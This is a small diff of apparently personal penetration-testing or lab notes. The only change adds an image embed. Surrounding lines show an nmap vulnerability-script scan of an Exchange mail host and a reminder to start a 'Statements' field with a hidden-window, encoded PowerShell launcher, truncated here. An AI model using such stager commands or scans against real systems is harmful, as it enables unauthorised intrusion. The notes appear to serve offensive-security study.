@@ -48,6 +48,9 @@ nmap --script http-vuln-exchange.nse mail.draconem.io
 **Remember:** The Statements field should start with `/c powershell -noP -sta -w 1 -enc ...`
 
 ![[Pasted image 20240324032203.png]]
+
+![[Pasted image 20240324032430.png]]
+
 ### Enumerate Users
 
 
